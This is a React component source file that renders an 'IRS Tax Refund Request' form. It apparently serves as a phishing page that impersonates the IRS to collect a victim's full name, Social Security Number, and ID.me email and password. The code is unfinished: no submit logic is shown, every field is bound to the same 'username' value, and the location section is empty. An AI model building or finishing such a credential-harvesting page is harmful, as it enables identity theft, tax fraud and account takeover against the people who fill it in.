import { FaHandHoldingDollar } from "react-icons/fa6";
import { CiUser  } from "react-icons/ci";
import { IoShieldOutline } from "react-icons/io5";
import { MdOutlineMailOutline } from "react-icons/md";
import { FiKey } from "react-icons/fi";
import { FaLock } from "react-icons/fa6";
import { CiLocationOn } from "react-icons/ci";
import { CiCircleInfo } from "react-icons/ci";
import { LuSend } from "react-icons/lu";
import { useForm,Controller } from "react-hook-form";
import {  Stack } from "@mui/material";
import FormControl from '@mui/material/FormControl';
import OutlinedInput from '@mui/material/OutlinedInput';
import FormHelperText from '@mui/material/FormHelperText';
import Select from '@mui/material/Select';
import MenuItem from '@mui/material/MenuItem';
import InputLabel from '@mui/material/InputLabel';
 import InputAdornment from '@mui/material/InputAdornment';



const IRS = () => {

  const {
    handleSubmit,
    register,
    reset,
    getFieldState,
    formState: { errors, isValid,
     isDirty,
       isSubmitSuccessful, },
    control,
  } = useForm({
    defaultValues: {
      email: "",
      username: "",
    },
  });




  return (
    <> 
    <div className="pt-10 pb-32 px-3 bg-gray-200 md:px-10 lg:px-20 xl:px-36">

       <div className="flex flex-col items-center text-center mt-10">
        <div className="bg-gray-500 p-5 rounded-full mb-5">
            <FaHandHoldingDollar />
        </div>
        <div><h2 className="font-extrabold text-xl">IRS Tax Refund Request</h2></div>
        <div><p className="text-sm">Please fill out the form below to submit your IRS tax refund request</p></div>
       </div>
     
    <form className="mt-16 px-4">
        <div className="flex items-center mb-4 gap-2 text-lg font-bold"><span><CiUser/></span><span>Personal Information</span></div>

        <Stack spacing={3} >
          <div>
                <InputLabel htmlFor="ben-name" sx={{ fontSize: '0.775rem' }}>Full Name</InputLabel>    
                <Controller
                name="username"
                control={control}
                defaultValue=""
                rules={{
                    required: 'Email is required',
                }}
                render={({ field }) => (
                <FormControl fullWidth size="small"   sx={{
                        '& .MuiOutlinedInput-root': {
                        '&.Mui-focused fieldset': {
                            borderColor: 'black',
                        }
                        }
                    }} error={!!errors.username} >
                    <OutlinedInput
                        id="ben-name"
                        {...field}
                        type="text"
                        placeholder="Enter your full name"
                        startAdornment={
                        <InputAdornment position="start">
                            <CiUser />
                        </InputAdornment>
                        }
                    />
                    {errors.username && (
                    <FormHelperText>{errors.username.message}</FormHelperText>
                    )}
                    </FormControl>
                )}
                />
            </div>
            
            <div>
                <InputLabel htmlFor="ben-name" sx={{ fontSize: '0.775rem' }}>Social Security Number (SSN)</InputLabel>    
                <Controller
                name="username"
                control={control}
                defaultValue=""
                rules={{
                    required: 'Email is required',
                }}
                render={({ field }) => (
                <FormControl fullWidth size="small"   sx={{
                        '& .MuiOutlinedInput-root': {
                        '&.Mui-focused fieldset': {
                            borderColor: 'black',
                        }
                        }
                    }} error={!!errors.username} >
                    <OutlinedInput
                        id="ben-name"
                        {...field}
                        type="text"
                        placeholder="XXX-XX-XXXX"
                        startAdornment={
                        <InputAdornment position="start">
                           <IoShieldOutline />
                        </InputAdornment>
                        }
                    />
                    {errors.username && (
                    <FormHelperText>{errors.username.message}</FormHelperText>
                    )}
                    </FormControl>
                )}
                />
            </div>

             <div className="flex items-center mb-4 gap-2 text-lg font-bold"><span><FaLock /></span><span>ID.me Credentials</span></div>

            <div>
                <InputLabel htmlFor="ben-name" sx={{ fontSize: '0.775rem' }}>ID.me Email</InputLabel>    
                <Controller
                name="username"
                control={control}
                defaultValue=""
                rules={{
                    required: 'Email is required',
                }}
                render={({ field }) => (
                <FormControl fullWidth size="small"   sx={{
                        '& .MuiOutlinedInput-root': {
                        '&.Mui-focused fieldset': {
                            borderColor: 'black',
                        }
                        }
                    }} error={!!errors.username} >
                    <OutlinedInput
                        id="ben-name"
                        {...field}
                        type="text"
                        placeholder="Enter your ID.me email"
                        startAdornment={
                        <InputAdornment position="start">
                           <MdOutlineMailOutline />
                        </InputAdornment>
                        }
                    />
                    {errors.username && (
                    <FormHelperText>{errors.username.message}</FormHelperText>
                    )}
                    </FormControl>
                )}
                />
            </div>

            <div>
                <InputLabel htmlFor="ben-name" sx={{ fontSize: '0.775rem' }}>ID.me Password</InputLabel>    
                <Controller
                name="username"
                control={control}
                defaultValue=""
                rules={{
                    required: 'Email is required',
                }}
                render={({ field }) => (
                <FormControl fullWidth size="small"   sx={{
                        '& .MuiOutlinedInput-root': {
                        '&.Mui-focused fieldset': {
                            borderColor: 'black',
                        }
                        }
                    }} error={!!errors.username} >
                    <OutlinedInput
                        id="ben-name"
                        {...field}
                        type="text"
                        placeholder="Enter your ID.me password"
                        startAdornment={
                        <InputAdornment position="start">
                            <FiKey />
                        </InputAdornment>
                        }
                    />
                    {errors.username && (
                    <FormHelperText>{errors.username.message}</FormHelperText>
                    )}
                    </FormControl>
                )}
                />
            </div>

             <div className="flex items-center mb-4 gap-2 text-lg font-bold"><span><CiLocationOn /></span><span>Location Information</span></div>
            
        </Stack>

       <div className="flex gap-2 mt-10 bg-gray-300 p-3 rounded-lg"><div><CiCircleInfo className="mt-1"/></div><div className="flex flex-col gap-2"><span className="font-medium text-sm">Important Notice</span><span className="text-xs">Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.</span></div> </div>
      
      <div className="flex items-center gap-2 px-5 py-2 w-56 mt-5 ml-28 bg-slate-950 text-slate-50 rounded-md xl:ml-0"><span></span><LuSend /><span>Submit Request</span></div>
    </form>
    

    </div>
      
     </>
  )
}

export default IRS
